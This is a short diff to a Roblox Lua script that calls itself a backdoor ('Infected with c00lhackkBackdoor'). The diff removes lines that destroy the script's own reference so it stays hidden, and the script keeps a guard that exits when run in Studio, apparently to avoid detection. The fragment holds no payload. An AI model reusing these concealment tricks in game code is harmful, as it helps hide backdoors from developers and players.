@@ -14,10 +14,6 @@ if game:GetService("RunService"):IsStudio() then
 	return 
 end
 
--- this hides the script, potentially securing the backdoor
-getfenv().script:Destroy()
-getfenv().script = nil
-
 print("[[-- Infected with c00lhackkBackdoor by cOSploit --]]")
 
 -- Features we have:
